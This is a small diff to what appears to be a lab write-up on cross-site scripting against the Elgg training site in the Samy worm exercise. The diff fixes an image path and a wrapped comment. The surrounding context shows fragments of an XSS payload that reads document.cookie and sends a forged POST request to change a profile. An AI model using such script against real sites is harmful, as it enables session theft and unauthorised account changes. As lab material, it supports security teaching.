@@ -48,7 +48,7 @@ To accomplish this, we repeat the previous task, but replace the `'xss'` string,
 ![2_1_samy](./writeup/images/2_1_samy.png)  
 **Figure 3:** JavaScript alert window payload to display user's cookie for the site.  
 
-![2_2_samy](./writeup.image/2_2_samy.png)  
+![2_2_samy](./writeup/images/2_2_samy.png)  
 **Figure 4:** JavaScript alert window displays our Elgg cookie when visiting Samy's profile.
 
 
@@ -72,8 +72,7 @@ Ajax.setRequestHeader("Cookie",document.cookie);
 Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
 // Construct the content. The format of the content can be learned
 // from LiveHTTPHeaders.
-var content="name=..&description=...&guid="; // You need to fill in the
-details.
+var content="name=..&description=...&guid="; // You need to fill in the details.
 // Send the HTTP POST request.
 Ajax.send(content);
 </script>
